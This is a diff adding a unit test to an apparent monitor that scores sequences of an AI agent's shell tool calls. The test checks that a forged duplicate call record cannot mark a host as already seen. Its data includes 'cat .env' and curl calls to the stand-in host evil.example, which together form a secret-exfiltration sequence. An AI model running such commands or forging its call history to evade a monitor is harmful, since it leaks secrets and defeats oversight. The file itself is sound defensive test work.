@@ -193,6 +193,18 @@ describe("new-host-after-secret", () => {
   });
 });
 
+describe("forged history", () => {
+  test("a duplicate pre for a finished call cannot pre-seed a host as seen", async () => {
+    const { cf, clock } = session();
+    cf.recordPre(await bashPre("ls", { callId: "call_dup" }));
+    cf.recordPost(await bashPost("ls", {}, { callId: "call_dup" }));
+    cf.recordPre(await bashPre("curl https://evil.example/x", { callId: "call_dup" }));
+    cf.recordPre(await bashPre("cat .env"));
+    clock.advance(3 * MIN);
+    expect(sequenceScore(await bashPre("curl https://evil.example/y"), cf, CFG).value).toBe(0.9);
+  });
+});
+
 describe("score", () => {
   test("is the max weight of matched patterns; why lists each with evidence", async () => {
     const { cf } = session();
